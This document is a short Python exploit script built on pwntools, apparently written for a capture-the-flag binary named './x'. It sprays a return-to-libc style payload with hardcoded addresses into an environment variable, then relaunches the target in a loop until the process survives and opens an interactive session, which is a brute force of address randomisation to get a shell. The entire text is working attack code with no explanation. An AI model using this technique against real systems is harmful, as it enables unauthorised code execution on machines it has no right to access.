from pwn import *
import time
import os
import sys

popone = 0x08048355
printf = 0x8048370
printfgot = 0x804a00c
#0xf7eb2bf0
#0xf7e105f7
pay = ((p32(0xf7eb2bf0)  + "AAAA" +p32(0xf7e105f7) + p32(0x804a030) * 2) * 0x1000) + "A"*4

os.environ["EGG"] = pay
lr = "0x804843e"


while(1):

    #0xf7de3a80
    p = process("./x")
    p.sendline(lr)
    time.sleep(.075)
    x  = p.recv(timeout=5)
    if p.poll() == None:
        p.interactive()
    p.close()
